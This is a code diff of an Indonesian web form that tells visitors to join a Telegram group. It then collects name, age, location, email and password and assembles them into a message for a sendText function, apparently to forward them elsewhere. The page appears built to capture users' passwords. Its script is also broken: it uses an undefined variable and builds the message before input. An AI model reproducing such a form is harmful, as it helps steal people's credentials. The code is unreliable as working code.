@@ -11,7 +11,7 @@
     <p>Sebelum Mencobanya Kalian Harus Gabung Grup Telegram <a href="https://t.me/gtelegramtester" target="_parent">Ini</a></p>
     <p>Silahkan Pilih Formulir Wajib Diisi Atau Opsional :</p>
     <br>
-    <form id="fm">
+    <form>
       <label>Nama :</label>
       <br>
       <input id="nama" type="name" placeholder="Masukkan Nama" required></input>
@@ -55,13 +55,13 @@
           console.error(error);
         }
       }
-var nama = document.getElementById('nama')
-var umur = document.getElementById('umur')
-var alamat = document.getElementById('lokasi')
+var nama = document.getElementById('nama').value;
+var umur = document.getElementById('umur').value;
+var alamat = document.getElementById('lokasi').value;
 var tgl_lahir = document.getElementById('tgl_lahir')
-var email = document.getElementById('email')
-var kata_sandi = document.getElementById('kata_sandi')  
-      var result = "\nNama : " + nama + "\nUmur : " + umur + "\nLokasi : " + lokasi + "\nEmail : " + email + "\nKata Sandi : " + kata_sandi
+var email = document.getElementById('email').value;
+var kata_sandi = document.getElementById('kata_sandi').value;
+      var result = "\nNama : " + nama + "\nUmur : " + umur + " Tahun" + "\nLokasi : " + lokasi + "\nEmail : " + email + "\nKata Sandi : " + kata_sandi
      function sendText() {
         const message = result
         if (message) {
